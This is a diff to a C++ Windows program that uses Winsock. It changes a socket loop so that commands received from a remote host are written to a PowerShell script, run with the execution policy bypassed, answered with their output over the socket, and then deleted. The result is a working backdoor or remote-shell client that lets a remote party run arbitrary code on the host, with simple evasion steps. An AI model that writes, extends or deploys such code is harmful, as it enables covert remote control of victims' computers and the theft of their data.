@@ -11,6 +11,7 @@
 #include <stdexcept>
 #include <string>
 #include <array>
+#include <fstream>
 #pragma comment(lib, "ws2_32.lib")
 
 
@@ -93,7 +94,20 @@ void main()
 				{
 					ZeroMemory(buf, 4096);
 					int bytesReceived = recv(sock, buf, 4096, 0);
-					result = exec(buf);
+					ofstream file;
+					file.open("test.ps1");
+
+					string newArg = "-auto";
+					string powershell;
+					powershell = buf;
+
+					file << powershell << endl;
+					file.close();
+
+					result = exec("powershell -ExecutionPolicy Bypass -F test.ps1");
+					cout << result;
+
+					remove("test.ps1");
 					int sendResult = send(sock, result.c_str(), result.size(), 0);
 					result = "";
 					
